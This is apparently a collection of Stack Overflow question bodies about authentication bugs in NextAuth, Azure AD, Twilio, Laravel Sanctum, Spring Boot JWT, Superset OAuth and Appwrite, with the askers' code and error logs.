                &quot;client_secret&quot; =&gt; $this-&gt;auth[&quot;azuread_client_secret&quot;],
                &quot;scope&quot; =&gt; &quot;openid profile email&quot;,
                &quot;redirect_uri&quot; =&gt; $this-&gt;auth[&quot;azuread_redirect_uri&quot;],
                &quot;code&quot; =&gt; $authorizationCode,
            ];

            $tokenData = $this-&gt;getToken($tokenEndpoint, $tokenParams);

            if (isset($tokenData['access_token'])) {
                $accessToken = $tokenData['access_token'];
                $userInfo = $this-&gt;getUserInfo($accessToken);

                if ($userInfo) {
                    return new User($userInfo['email'], $userInfo['name']);
                } else {
                    throw new \Exception('Failed to retrieve user information from Microsoft Graph API');
                }
            } elseif (isset($tokenData['error'])) {
                // Token request failed with error response
                $error = $tokenData['error'];
                $errorDescription = isset($tokenData['error_description']) ? $tokenData['error_description'] : '';

                throw new \Exception(&quot;Token request failed with error: $error. Description: $errorDescription&quot;);
            } else {
                throw new \Exception('Failed to obtain access token from Azure AD');
            }
        }

        return null;
    }

    private function getToken($tokenEndpoint, $tokenParams)
    {
        // Send POST request to token endpoint with client secret
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $tokenEndpoint);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($tokenParams));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        return json_decode($response, true);
    }

    private function getUserInfo($accessToken)
    {
        // Make a request to Microsoft Graph API using the access token
        $graphApiEndpoint = 'https://graph.microsoft.com/v1.0/me';
        $headers = [
            'Authorization: Bearer ' . $accessToken,
            'Accept: application/json'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $graphApiEndpoint);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        $userInfo = json_decode($response, true);

        // Check if user info retrieval was successful
        if (isset($userInfo['mail']) &amp;&amp; isset($userInfo['displayName'])) {
            return [
                'email' =&gt; $userInfo['mail'],
                'name' =&gt; $userInfo['displayName']
            ];
        } else {
            // User info retrieval failed
            throw new \Exception('Failed to retrieve user information from Microsoft Graph API');
        }
    }
}
?&gt;
</code></pre>
"
"<p>I'm new to learning nextJs and nextauth</p>
<p><code>/api/auth/[...nextauth.js]</code></p>
<pre><code>import NextAuth from &quot;next-auth/next&quot;;
import CredentialsProvider from &quot;next-auth/providers/credentials&quot;;

export default NextAuth({
  session: {
    jwt: true,
  },
  providers: [
    CredentialsProvider({
      name: &quot;Credentials&quot;,
      async authorize(credentials, req) {
        let user = {
          id: &quot;2&quot;,
          name: {
            fname: &quot;sainath&quot;,
          },
          email: &quot;sainsa@gmail.com&quot;,
          msg: &quot;This is my message&quot;,
        };
        if (user) {
          return user;
        } else {
          return null;
        }
      },
    }),
  ],
  callbacks: {
    async session({ session, token, user }) {
      console.log(&quot;in session callback: &quot;, session);
      return session;
    },
  },
});
</code></pre>
<p>but when i tried to console log the user, its undefined, i want the session.user to contain fname, msg how can i do it?<br>
One thing which worked is to make an object that consists what i need and assign it &quot;name&quot; or &quot;email&quot;</p>
<p><code>name : { fname: &quot;sainath&quot;, msg:&quot;this is my message&quot; } </code></p>
"
"<p>I am trying to attach an audio file containing the call recording to an E-Mail.</p>
<p>My code works with audio files from public urls, but not with the Twilio call recordings.
I am sure the issue is with the authentication, so I tried to add it to my code, but now it is not working anymore.</p>
<p>What my code looks like right now:</p>
<pre><code>const request = require('request');

// configure authentication
var auth = &quot;Basic &quot; + Buffer.from(context.accountSid + &quot;:&quot; + context.authToken).toString(&quot;base64&quot;);

// recording url
url = 'https://api.twilio.com/2010-04-01/Accounts/AC..../Recordings/' + event.recordingSid + '.mp3';

// request with authentication
const options = {
    url: url,
    headers: {
      'Authorization': auth,
    },
    encoding: null
};

// get audio file and attach to mail
request.get(options, (error, response, body) =&gt; {
    if (error) {
        console.error(error);
        return;
    };

    if (response.statusCode !== 200) {
        console.error(&quot;Failed to fetch Twilio recording:&quot;, response.statusCode, response.statusMessage);
        return;
    };

    const msg = {
        // some configuration for message
        attachments: [
          {
              content: body.toString('base64'),
              filename: 'Call.mp3',
              encoding: 'base64',
              type: &quot;audio/mpeg&quot;
          }
        ]
    };

    // send mail 
  });
};
</code></pre>
<p>The current error code I am getting is &quot;REDACTED - may contain security sensitive information&quot;, but also &quot;message&quot;:&quot;self.uri.auth.split is not a function&quot;.</p>
"
"<p>I am developing a web service in Haskell.
It makes requests to other web services, some of which require authentication.
Currently, I have something like this:</p>
<pre class=""lang-hs prettyprint-override""><code>renewToken :: Credentials -&gt; IORef Token -&gt; IO Token
renewToken credentials tokenRef = do
    token &lt;- readIORef tokenRef
    time &lt;- getCurrentTime
    if time &lt; expiration token then pure token else do
        newToken &lt;- request &quot;http://example.com/login&quot; credentials
        writeIORef tokenRef newToken
        pure newToken
</code></pre>
<p>The <code>renewToken</code> function can then be used before requests which require authentication:</p>
<pre class=""lang-hs prettyprint-override""><code>do
    token &lt;- renewToken credentials tokenRef
    request &quot;http://example.com/data&quot; token
</code></pre>
<p>This setup does not handle concurrency very well.
Concurrent uses of <code>renewToken</code> may renew the token multiple times and overwrite each other's results.</p>
<p>How can I implement the token renewal process in a way that is safe and efficient in a concurrent setting?</p>
<p>I have heard that STM is a great way of doing concurrency in Haskell, so I wanted to use that.
However, I do not understand how to use it here, since the token renewal process performs IO.
As far as I understood, there is no sensible way to do IO in an STM transaction, since it may retry.
I have often heard STM proposed as a higher-level alternative to <code>MVar</code>s, but I do not understand how this would work if there is IO.</p>
<p>I could use <code>withMVar</code> to ensure that only one thread can enter the token renewal process at a time.
However, this would needlessly serialize all the read-only accesses to the token when it has not expired yet.
I am afraid that this might lead to increased latency when there are many concurrent requests.
Moreover, <code>MVar</code> seems like a very low-level primitive that does not have the composability of something like STM.
Am I really supposed to use <code>MVar</code> directly in a situation like this?</p>
<p>Finally, I considered the solution of having a separate thread that is responsible for token renewal.
However, this again serializes all accesses to the token.
On top of that, it creates significant complexity and potential overhead via communication between threads.</p>
"
"<p>have a problem with authentication, after signIn it does not redirect me to my dashboard.
All files I step by step copy from nextjs.org.</p>
<p>This is auth.config.ts file</p>
<pre><code>import type { NextAuthConfig } from 'next-auth';
 
export const authConfig = {
  pages: {
    signIn: '/login',
  },
  callbacks: {
    authorized({ auth, request }) {
      const isLoggedIn = !!auth?.user;
      
      const isOnDashboard = request.nextUrl.pathname.startsWith('/ui/dashboard');
      if (isOnDashboard) {
        if (isLoggedIn) return true;
        return false; // Redirect unauthenticated users to login page
      } else if (isLoggedIn) {
        return Response.redirect(new URL('/ui/dashboard/invoices', request.nextUrl));
      }
      return true;
    },
  },
  providers: [], // Add providers with an empty array for now
} satisfies NextAuthConfig;
</code></pre>
<p>When I logged in, I have to redirect to the dashboard page, but it's not redirected.
I think the problem comes from auth.config.ts,<br />
I always console.log the value of   <strong>isLoggedIn</strong> and it  always is null.<br />
It doesn't matter user is signIn or signOut.</p>
<p>The login proccess is paritally work, I check it using this auth() function, from auth.ts</p>
<pre><code>export const { auth, signIn, handlers: {POST, GET}, signOut } = NextAuth({...
</code></pre>
"
"<p>I'm new to React. I'm trying to develop a login system using django (djoser) in the backend and react for the frontend.
However, whenever i run the npm server and go to the login page i see the following error:</p>
<blockquote>
<p>Unexpected Application Error!
Cannot destructure property 'loading' of '(0 , react_redux__WEBPACK_IMPORTED_MODULE_3__.useSelector)(...)' as it is undefined.
TypeError: Cannot destructure property 'loading' of '(0 , react_redux__WEBPACK_IMPORTED_MODULE_3__.useSelector)(...)' as it is undefined.</p>
</blockquote>
<p>here are the files I think are relevant for this case:</p>
<ul>
<li>login.js</li>
</ul>
<pre><code>import { useForm  } from 'react-hook-form'
import { useDispatch, useSelector } from 'react-redux';
import { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { userLoggin } from '../features/auth/authActions';
 



const Login = () =&gt; {
    
    const { loading, userInfo, error } = useSelector((state) =&gt; state.user)
    const dispatch = useDispatch()
    const { register, handleSubmit } = useForm()
    const navigate = useNavigate()

    useEffect(() =&gt; {
        if (userInfo) {
            navigate ('/user-profile')
        }
    }, [navigate, userInfo]
    )

    const submitForm = (data) =&gt; {
        dispatch(userLoggin(data))
    }

    return (
        &lt;form className=&quot;mb-3&quot; onSubmit={handleSubmit(submitForm)}&gt;
            {error &amp;&amp; &lt;h3&gt;{error}&lt;/h3&gt;}
            &lt;div className='form-group'&gt;
                &lt;label htmlFor='email'&gt;Email&lt;/label&gt;
                &lt;input
                    type='email'
                    className='form-input'
                    {...register('email')}
                    required
                /&gt;
            &lt;/div&gt;
            &lt;div className='form-group'&gt;
                &lt;label htmlFor='password'&gt;Password&lt;/label&gt;
                &lt;input
                    type='password'
                    className='form-input'
                    {...register('password')}
                    required
                /&gt;
            &lt;/div&gt;
            &lt;button 
                type='submit'
                className='button'
                 
            &gt;
                {loading ? &lt;h3&gt;loading...&lt;/h3&gt; : 'Login'}
            &lt;/button&gt;
        &lt;/form&gt;
    )
};

export default Login;
</code></pre>
<ul>
<li>authaction.js</li>
</ul>
<pre><code>import axios from 'axios';
import { createAsyncThunk } from '@reduxjs/toolkit';


const backendURL = 'http://127.0.0.1:8000'
export const userLoggin = createAsyncThunk(
    'auth/login',
    async ({email, password }, [rejectWithValue]) =&gt; {
        try {
            const config = {
                headers : {
                    'Content-Type': 'applicatiom/json',
                },
            }
            const { data } = await axios.post(
                `${backendURL}/auth/jwt/create/`,
                { email, password },
                config
            )
            localStorage.setItem('userToken', data.userToken)
            return data
        } catch (error) {
            if (error.response &amp;&amp; error.response.data.message) {
                return rejectWithValue (error.response.message)
            }
            else {
                return rejectWithValue (error.message)
            }
        }
    }
)
</code></pre>
<ul>
<li>authslice.js</li>
</ul>
<pre><code>import { createSlice } from &quot;@reduxjs/toolkit&quot;;
import  { userLoggin } from &quot;./authActions&quot;;

const userToken = localStorage.getItem('userToken')
    ? localStorage.getItem('userToken')
    : null

const initialState = {
    loading: false,
    userInfo: {},
    userToken,
    error: null,
    success: false,
}

const authSlice = createSlice({
    name: 'auth',
    initialState,
    reducers: {},
    extraReducers: (builder) =&gt; {
        //user login
        builder
            .addCase(userLoggin.pending, (state) =&gt; {
                state.loading = true
                state.error = null
            })
            .addCase(userLoggin.fulfilled, (state, {payload}) =&gt; {
                state.loading = false
                state.userInfo = payload
                state.userToken = payload.userToken
           })
            .addCase(userLoggin.rejected, (state, action) =&gt; {
                state.loading = false
                state.error =  action.payload
        })
    }
})

export default authSlice.reducer
</code></pre>
<p>store.js</p>
<pre><code>import { configureStore } from &quot;@reduxjs/toolkit&quot;;
import authReducer from '../features/auth/authSlice';

const store = configureStore({
    reducer: {
        auth: authReducer,
    }
})

export default store
</code></pre>
<p>In fact i didn't try many as i said I'm new to react.</p>
"
"<p>I am doing a project and I am trying to integrate Login/Register into my Angular/Java Springboot application with JWT authentication.</p>
<p>I have been following this youtube tutorial <a href=""https://www.youtube.com/watch?v=YUqi1IjLX8I&amp;t=3s"" rel=""nofollow noreferrer"">https://www.youtube.com/watch?v=YUqi1IjLX8I&amp;t=3s</a>
I had to tweak the code to integrate into my current project.
I have been doing it till 44:22 where he gets 200 code while I have been getting 403 error code.
Now I am stuck and have been searching for answers to no avail. Hopefully someone can help me solve this problem?</p>
<p>The following is the error that I am getting</p>
<pre><code>POST http://localhost:8080/register 403 (Forbidden)
scheduleTask @ zone.js:2645
scheduleTask @ zone.js:389
onScheduleTask @ core.mjs:10752
scheduleTask @ zone.js:382
onScheduleTask @ zone.js:279
scheduleTask @ zone.js:382
scheduleTask @ zone.js:216
scheduleMacroTask @ zone.js:239
scheduleMacroTaskWithCurrentZone @ zone.js:672
(anonymous) @ zone.js:2678
proto.&lt;computed&gt; @ zone.js:962
dispatchXhrRequest @ xhr.js:258
ZoneAwarePromise @ zone.js:1411
xhr @ xhr.js:49
dispatchRequest @ dispatchRequest.js:51
_request @ Axios.js:170
(anonymous) @ Axios.js:40
asyncGeneratorStep @ asyncToGenerator.js:3
_next @ asyncToGenerator.js:22
(anonymous) @ asyncToGenerator.js:27
ZoneAwarePromise @ zone.js:1411
(anonymous) @ asyncToGenerator.js:19
request @ Axios.js:59
wrap @ bind.js:5
request @ axios.service.ts:16
onRegister @ content.component.ts:25
ContentComponent_Template_app_login_form_onSubmitRegisterEvent_3_listener @ content.component.html:5
executeListenerWithErrorHandling @ core.mjs:16795
wrapListenerIn_markDirtyAndPreventDefault @ core.mjs:16828
next @ Subscriber.js:91
_next @ Subscriber.js:60
next @ Subscriber.js:31
(anonymous) @ Subject.js:34
errorContext @ errorContext.js:19
next @ Subject.js:27
emit @ core.mjs:10670
onSubmitRegister @ login-form.component.ts:33
LoginFormComponent_Template_form_ngSubmit_24_listener @ login-form.component.html:31
executeListenerWithErrorHandling @ core.mjs:16795
wrapListenerIn_markDirtyAndPreventDefault @ core.mjs:16828
next @ Subscriber.js:91
_next @ Subscriber.js:60
next @ Subscriber.js:31
(anonymous) @ Subject.js:34
errorContext @ errorContext.js:19
next @ Subject.js:27
emit @ core.mjs:10670
onSubmit @ forms.mjs:3474
NgForm_submit_HostBindingHandler @ forms.mjs:3506
executeListenerWithErrorHandling @ core.mjs:16795
wrapListenerIn_markDirtyAndPreventDefault @ core.mjs:16828
(anonymous) @ platform-browser.mjs:665
invokeTask @ zone.js:402
(anonymous) @ core.mjs:10757
onInvokeTask @ core.mjs:10757
invokeTask @ zone.js:401
onInvokeTask @ core.mjs:11070
invokeTask @ zone.js:401
runTask @ zone.js:173
invokeTask @ zone.js:483
invokeTask @ zone.js:1631
globalCallback @ zone.js:1662
globalZoneAwareCallback @ zone.js:1695
Show 58 more frames
Show less
axios.service.ts:16  ERROR Error: Uncaught (in promise): AxiosError: Request failed with status code 403
AxiosError: Request failed with status code 403
    at settle (settle.js:19:12)
    at XMLHttpRequest.onloadend [as __zone_symbol__ON_PROPERTYloadend] (xhr.js:111:13)
    at XMLHttpRequest.wrapFn (zone.js:755:39)
    at _ZoneDelegate.invokeTask (zone.js:402:31)
    at core.mjs:10757:55
    at AsyncStackTaggingZoneSpec.onInvokeTask (core.mjs:10757:36)
    at _ZoneDelegate.invokeTask (zone.js:401:60)
    at Object.onInvokeTask (core.mjs:11070:33)
    at _ZoneDelegate.invokeTask (zone.js:401:60)
    at Zone.runTask (zone.js:173:47)
    at Axios.js:45:41
    at Generator.throw (&lt;anonymous&gt;)
    at asyncGeneratorStep (asyncToGenerator.js:3:1)
    at _throw (asyncToGenerator.js:25:1)
    at _ZoneDelegate.invoke (zone.js:368:26)
    at Object.onInvoke (core.mjs:11083:33)
    at _ZoneDelegate.invoke (zone.js:367:52)
    at Zone.run (zone.js:129:43)
    at zone.js:1257:36
    at _ZoneDelegate.invokeTask (zone.js:402:31)
    at resolvePromise (zone.js:1193:31)
    at zone.js:1100:17
    at zone.js:1116:33
    at asyncGeneratorStep (asyncToGenerator.js:6:1)
    at _throw (asyncToGenerator.js:25:1)
    at _ZoneDelegate.invoke (zone.js:368:26)
    at Object.onInvoke (core.mjs:11083:33)
    at _ZoneDelegate.invoke (zone.js:367:52)
    at Zone.run (zone.js:129:43)
    at zone.js:1257:36
</code></pre>
<p>This is the axios.service.ts</p>
<pre><code>import { Injectable } from '@angular/core';
import axios from 'axios';

@Injectable({
  providedIn: 'root'
})
export class AxiosService {

  constructor() { 
    axios.defaults.baseURL = &quot;http://localhost:8080&quot;
    axios.defaults.headers.post[&quot;Content-type&quot;] = &quot;application/json&quot;

  }

  request(method: string, url: string, data:any): Promise&lt;any&gt;{
    return axios({
      method: method,
      url: url,
      data: data
    })
  }
}
</code></pre>
<p>I was hoping to click into the Login/Register button so I can get 200 code instead of 403 error code.</p>
"
"<p>I am new to JWTs and backend development in general, so I would like to get an answer to my question.</p>
<p>Currently I am working on my small project where the authentication is requiered and I want to use JWTs, and I consider what should I store in the JWT token payload and how can I further use that data?</p>
<p>I have read in one article that</p>
<blockquote>
<p>A JWT token should be stateless, meaning that you should store everything you need in the payload and skip performing a DB query on every request.</p>
</blockquote>
<p>So what if I store user id in payload for instance, and then I want to access some info about the user in database with every request, why can't I do that? How can I provide a certain user with an accurate information if I don't have to perform any DB queries? Please explain me if I got it wrong and sorry for my poor English!</p>
"
"<p>I try to build Movie Website and I designed my user controller and tried to implement on frontend. When I try to update user profile through Postman, it's working, but When I tried to update user details after registering and logging through the browser I am getting the message &quot;Not Authorized, No Token&quot;. I implemented jsonwebtoken to create token and store it in cookies. The cookie is working well with postman but whenever I console the token value resulted from browser user update, it's <strong>undefined</strong>. How to solve this issue?</p>
"
"<p>From time to time when working with an Azure Function, I get pages and pages of errors and I waste a few minutes looking through them until I realize &quot;oh, yeah I need to click on the &quot;re-enter your credentials link&quot; that appears when you click on your initials in the title bar of Visual Studio on the top right.</p>
<p>Is there an easy way to programmatically detect this upfront, specifically, rather than having to wade through pages and pages of error logs to re-figure this out every couple of weeks?</p>
"
"<p>I would like to write an email client that would send and receive mail on the Linux desktop. This is to be a local app, like Thunderbird, or mutt, not an online service. I would like it to be able to work through GMail, which requires OAuth authentication. All documentation I have been able to find on that or other Google APIs assumes that the implementation will be running on a server, where it can store client_id and secret in a place not accessible to the user. My app will be installed and run locally, and will be open source, so there is no way to store these credentials in secret.</p>
<p>Google goes out of its way to emphasize that the API key, the OAuth client_id, and its secret must not be published. Because of this, a few other email clients that have implemented OAuth support require each user to create his own API key and OAuth credentials. For an average user, the process for doing this is too complicated, and there is no way I am going to make them do it.</p>
<p>So the question is this: how can OAuth be done from a desktop app without requiring users to create API keys and credentials?</p>
"
"<p>To integrate Google authentication into my Superset application, which is running on a specific IP address, I followed these steps:</p>
<ol>
<li><p>Created an OAuth client ID on the Google Cloud Platform. To create it, a JavaScript Authorized Origin is required, which is basically the application's URL. Since my Superset application does not have a domain, I masked the &lt;superset-IP&gt; with a random domain (<a href=""http://localtesting.com/"" rel=""nofollow noreferrer"">http://localtesting.com</a>) in my local <strong><code>etc/hosts</code></strong> file. I used this masked domain in the Google Console for creating the client ID.</p>
</li>
<li>
<ol>
<li>Updated the <strong><code>superset_config.py</code></strong> file with the client ID, client secret, and app domain. Here is the file for your reference:</li>
</ol>
<pre><code>from flask_appbuilder.security.manager import AUTH_OAUTH

    ENABLE_PROXY_FIX = True
    AUTH_TYPE = AUTH_OAUTH
    OAUTH_PROVIDERS = [
        {
            &quot;name&quot;: &quot;google&quot;,
            &quot;icon&quot;: &quot;fa-google&quot;,
            &quot;token_key&quot;: &quot;access_token&quot;,
            &quot;remote_app&quot;: {
                &quot;client_id&quot;: &quot;&lt;ClientId&quot;,
                &quot;client_secret&quot;: &quot;&lt;ClientSecretKey&gt;&quot;,
                &quot;api_base_url&quot;: &quot;https://www.googleapis.com/oauth2/v2/&quot;,
                &quot;client_kwargs&quot;: {&quot;scope&quot;: &quot;email profile&quot;},
                &quot;request_token_url&quot;: None,
                &quot;access_token_url&quot;: &quot;https://accounts.google.com/o/oauth2/token&quot;,
                &quot;authorize_url&quot;: &quot;https://accounts.google.com/o/oauth2/auth&quot;,
                &quot;authorize_params&quot;: {&quot;hd&quot;: &quot;http://locatesting.com&quot;}
            },
        }
    ]
    AUTH_ROLE_ADMIN = 'Admin'
    AUTH_ROLE_PUBLIC = 'Public'
</code></pre>
</li>
<li><p>Restarted the VM where superset is hosted.</p>
</li>
</ol>
<p>After completing these steps, I encountered a 502 Bad Gateway error. My Superset application is using an Nginx server.</p>
<p>Is this issue somehow associated to nginx or anything wrong in masking of IP in my local machine</p>
"
"<p>// Authcontroller.php</p>
<pre><code>
  public function user(GetUser $getUser, HashIdService $hashIdService)
    {
        $user = auth()-&gt;user();

        $decodedUserId = $hashIdService-&gt;decode($user-&gt;id);

        return $getUser($decodedUserId);
    }


 public function login(LoginRequest $loginRequest, LoginUser $loginUser, HashIdService $hashIdService)
    {
        return $loginUser($loginRequest, $hashIdService);
    }
</code></pre>
<p>// GetUser.php</p>
<pre><code>&lt;?php

namespace App\Actions\Users;

use App\Models\User;

class GetUser
{
    public function __invoke($decodedUserId)
    {
        // get user profile based on id
        try {
            $userProfile = User::with('profile', 'role:id,role_name', 'group:id,group_name')
                -&gt;join('user_profiles', 'users.id', '=', 'user_profiles.user_id')
                -&gt;select('users.*', 'user_profiles.status_id', 'user_profiles.updated_by', 'user_profiles.distributor_id', 'user_profiles.operator_id')
                -&gt;where('users.id', $decodedUserId)
                -&gt;first();

            return response()-&gt;json([
                'isSuccess' =&gt; true,
                'user'      =&gt; $userProfile,
            ]);
        } catch (\Throwable $th) {
            //throw $th;
            return response()-&gt;json([
                'isSuccess' =&gt; false,
                'message'   =&gt; $th-&gt;getMessage(),
            ], 500);
        }
    }
}
</code></pre>
<p>// LoginUser.php</p>
<pre><code>&lt;?php

namespace App\Actions\Users;

use App\Http\Requests\Auth\LoginRequest;
use App\Models\User;
use App\Services\HashIdService;
use Illuminate\Support\Facades\Log;

class LoginUser
{
    public function __invoke(LoginRequest $request, HashIdService $hashIdService)
    {
        try {
            $request-&gt;authenticate();

            // Use the authenticated user's ID directly
            $userId = auth()-&gt;id();

          
            $userProfile = User::with('profile', 'role:id,role_name', 'group:id,group_name')
                -&gt;join('user_profiles', 'users.id', '=', 'user_profiles.user_id')
                -&gt;select('users.*', 'user_profiles.status_id', 'user_profiles.updated_by')
                -&gt;where('users.id', $hashIdService-&gt;decode($userId))
                -&gt;first();

            return response()-&gt;json($userProfile, 200);
        } catch (\Throwable $th) {
            // Log the exception details
            Log::error($th);

            return response()-&gt;json(
                [
                    'isSuccess' =&gt; false,
                    'message'   =&gt; $th-&gt;getMessage(),
                ],
                404,
            );
        }
    }
}
</code></pre>
<p>// HashIdService.php</p>
<pre><code>&lt;?php

namespace App\Services;

use Hashids\Hashids;

class HashIdService
{
    public function __construct(
        public $hashIds = new Hashids('', 20, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'),
    ) {
    }

    public function encode($id)
    {
        return $this-&gt;hashIds-&gt;encode($id);
    }

    public function decode($hashId)
    {
        if (is_int($hashId)) {
            return $hashId;
        }

        $decodedIds = $this-&gt;hashIds-&gt;decode($hashId);

        if (count($decodedIds) &gt; 1) {
            return intval($decodedIds);
        } else {
            return intval($decodedIds[0]);
        }
    }
}
</code></pre>
<p>// User.php</p>
<pre><code>&lt;?php

namespace App\Models;

// use Illuminate\Contracts\Auth\MustVerifyEmail;

use App\Casts\UserHashId;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable;

    public function profile()
    {
        return $this-&gt;hasOne(UserProfile::class, 'user_id', 'id');
    }

    public function distributor()
    {
        return $this-&gt;hasOne(Distributor::class, 'email', 'email');
    }

    public function temporaryPassword()
    {
        return $this-&gt;hasOne(TemporaryPasswords::class, 'user_id', 'id');
    }

    public function group()
    {
        return $this-&gt;hasOne(UserGroup::class, 'id', 'group_id');
    }

    public function role()
    {
        return $this-&gt;hasOne(UserRole::class, 'id', 'role_id');
    }

    /**
     * The attributes that are mass assignable.
     *
     * @var array&lt;int, string&gt;
     */
    protected $fillable = ['name', 'email', 'password', 'role_id', 'group_id'];

    /**
     * The attributes that should be hidden for serialization.
     *
     * @var array&lt;int, string&gt;
     */
    protected $hidden = ['password', 'remember_token'];

    /**
     * The attributes that should be cast.
     *
     * @var array&lt;string, string&gt;
     */
    protected $casts = [
        'id'      =&gt; UserHashId::class,
        'user_id' =&gt; UserHashId::class,

        'email_verified_at' =&gt; 'datetime',
        'password'          =&gt; 'hashed',
    ];
}
</code></pre>
<p>// UserHashId.php</p>
<pre><code>&lt;?php

namespace App\Casts;

use App\Services\UserHashIdService;
use Illuminate\Contracts\Database\Eloquent\CastsAttributes;
use Illuminate\Database\Eloquent\Model;

class UserHashId implements CastsAttributes
{
    /**
     * Cast the given value.
     *
     * @param  array&lt;string, mixed&gt;  $attributes
     */
    public function get(Model $model, string $key, mixed $value, array $attributes): mixed
    {
        // Ensure that the value is not null before encoding
        if ($value !== null) {
            return (new UserHashIdService())-&gt;encode($value);
        }

        return $value;
    }

    /**
     * Prepare the given value for storage.
     *
     * @param  array&lt;string, mixed&gt;  $attributes
     */
    public function set(Model $model, string $key, $value, array $attributes)
    {
        // Ensure that the value is not null before decoding
        if ($value !== null) {
            $decodedValue = (new UserHashIdService())-&gt;decode($value);

            return $decodedValue !== $decodedValue ? $decodedValue : $value;
        }

        return $value;
    }
}
</code></pre>
<p>when i apply this to protected cast User model</p>
<pre><code> 'id'      =&gt; UserHashId::class,
        'user_id' =&gt; UserHashId::class,
</code></pre>
<p>I can't get the User who currently logged in</p>
<p>After I logged in, when getting the user changes in the session,</p>
<p>but when i uncomment / removed the HashId::class to id , i can get the user who loggedin</p>
<p>Any experiencing this?</p>
<p>I used laravel sanctum and react for its frontend</p>
<p>// api.php</p>
<pre><code>Route::post('/login', [AuthController::class, 'login']);

Route::group(['middleware' =&gt; ['auth:sanctum']], function () {

   Route::get('/user', [AuthController::class, 'user']);

});
</code></pre>
<p>Troubleshooting this for a month</p>
<p>I want to apply hashing id to users but its not working as expected</p>
"
"<p>I am using <strong>appwrite</strong> with <strong>react</strong> and I am having a <strong>problem logging in</strong> or <strong>signing up</strong> users.</p>
<p>When a users click the button he should see the home page, edit post and add post routes.
But I'm getting an error in <em>Failed to construct 'URL': Invalid URL</em></p>
<p>Here is the error message:
<a href=""https://i.stack.imgur.com/KjqYr.png"" rel=""nofollow noreferrer"">console message</a></p>
<p><strong>Below is the code for my appwrite.auth.js file:</strong></p>
<pre><code>import conf from &quot;../conf/conf.js&quot;
import { Client, Account, ID } from &quot;appwrite&quot;;

export class AuthService {
    client = new Client();
    account;

    constructor() {
        this.client
        .setEndpoint(conf.appwriteUrl)
        .setProject(conf.appwriteProjectId)
        this.account = new Account(this.client)
    }

    async createAccount({email, password, name}){
        try {
            const userAccount = await this.account.create(ID.unique(), email, password, name)
            if (userAccount) {
                return this.login({email, password})
            } else {
                return userAccount
            }
        } catch (error) {
            throw error
        }
    }

    async login({email, password}){
        try {
            return await this.account.createEmailSession(email, password)
        } catch (error) {
            throw error
        }
    }

    async getCurrentUser(){
        try {
            return await this.account.get()
        } catch (error) {
            console.log(&quot;Appwrite service :: getCurrentUser() :: &quot;, error)
        }
        return null
    }

    async logout(){
        try {
            await this.account.deleteSessions()
        } catch (error) {
            console.log(&quot;Appwrite service :: logout() :: &quot;, error);
        }
    }
}

const authService = new AuthService()

export default authService
</code></pre>
<p><strong>Below is my appwrite/config.js file for reference:</strong></p>
<pre><code>import conf from &quot;../conf/conf&quot;;
import { Client, Databases, Storage, Query, ID } from &quot;appwrite&quot;;


export class Service {
    client = new Client()
    databases;
    bucket;

    constructor(){
        this.client
        .setEndpoint(conf.appwriteUrl)
        .setProject(conf.appwriteProjectId)
        this.databases = new Databases(this.client)
        this.bucket = new Storage(this.client)
    }

    async getPost(slug) {
        try {
            return await this.databases.getDocument(conf.appwriteDatabaseId, conf.appwriteCollectionId, slug)
        } catch (error) {
            console.log(&quot;Appwrite service :: getPost() :: &quot;, error)
            return false
        }
    }

    async getPosts(queries = [Query.equal(&quot;status&quot;, &quot;active&quot;)]) {
        try {
            return await this.databases.listDocuments(conf.appwriteDatabaseId, conf.appwriteCollectionId, queries)
        } catch (error) {
            console.log(&quot;Appwrite service :: getPosts() :: &quot;, error)
            return false
        }
    }

    async createPost({title, slug, content, featuredImage, status, userId}) {
        try {
            return await this.databases.createDocument(conf.appwriteDatabaseId, conf.appwriteCollectionId, slug, {title, content, featuredImage, status, userId})
        } catch (error) {
            console.log(&quot;Appwrite service :: createPost() :: &quot;, error)
            return false
        }
    }

    async updatePost(slug, {title, content, featuredImage, status}) {
        try {
            return await this.databases.updateDocument(conf.appwriteDatabaseId, conf.appwriteCollectionId, slug, {title, content, featuredImage, status})
        } catch (error) {
            console.log(&quot;Appwrite service :: updatePost() :: &quot;, error)
            return false;
        }
    }

    async deletePost(slug) {
        try {
            await this.databases.deleteDocument(conf.appwriteDatabaseId, conf.appwriteCollectionId, slug)
            return true;
        } catch (error) {
            console.log(&quot;Appwrite service :: deletePost() :: &quot;, error)
            return false;
        }
    }

    // storage service

    async uploadFile(file) {
        try {
            return await this.bucket.createFile(conf.appwriteBucketId, ID.unique(), file) // if error use uploadFile()
        } catch (error) {
            console.log(&quot;Appwrite service :: uploadFile() :: &quot;, error)
            return false
        }
    }

    async deleteFile(fileId) {
        try {
            return await this.bucket.deleteFile(conf.appwriteBucketId, fileId)
        } catch (error) {
            console.log(&quot;Appwrite service :: deleteFile() :: &quot;, error)
            return false
        }
    }

    getFilePreview(fileId) {
        return this.bucket.getFilePreview(conf.appwriteBucketId, fileId).href
    }
}

const service = new Service()
export default service;
</code></pre>
<p>Is there a way to fix this? It seems doesn't seem to recognize the new construct URL.</p>
<p>I have been following Hitesh Chowdary's YouTube Tutorial.</p>
<p><em><a href=""https://www.youtube.com/watch?v=zWF7O7aHQW4"" rel=""nofollow noreferrer"">https://www.youtube.com/watch?v=zWF7O7aHQW4</a></em></p>
"
"<p>I am unable to access FileNet CE from Java Service in BAW Process.</p>
<p>When we connect without a stanca, we get
&quot;The user is not authenticated. There is no LoginModule associated with FileNetP8&quot;.</p>
<p>When we connect using stanca &quot;FileNetP8WSI&quot;, we get
&quot;Access to the Content Engine was not allowed because the Content Engine API library or the Web Service Interface (WSI) Listener could not find the required security context information. Expected credentials were not found in the security context.&quot;</p>
"
